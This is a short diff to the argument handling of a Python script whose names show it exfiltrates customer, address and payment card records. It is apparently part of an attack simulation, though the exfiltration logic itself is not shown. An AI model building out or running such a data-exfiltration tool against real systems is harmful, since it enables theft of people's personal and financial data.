@@ -67,16 +67,16 @@ if __name__=="__main__":
     if len(sys.argv) < 1:
         print "triggered"
     addr= sys.argv[1]
-    amt = parameters.amt_to_exfil
+    amt = int(sys.argv[2])
 
     # so the appriorate sizes of the various api calls should be passed in, but if not we can use estimates
     amt_customers = 734589
     amt_addresses = 174940
     amt_cards = 48446
     #amt_customer = # this isn't actually needed
-    if len(sys.argv) >= 4:
-        amt_customers = int(sys.argv[2])
-        amt_addresses = int(sys.argv[3])
-        amt_cards = int(sys.argv[4])
-    #    amt_customer = sys.argv[5] 
+    if len(sys.argv) >= 5:
+        amt_customers = int(sys.argv[3])
+        amt_addresses = int(sys.argv[4])
+        amt_cards = int(sys.argv[5])
+    #    amt_customer = sys.argv[6] 
     exfiltrate_data()
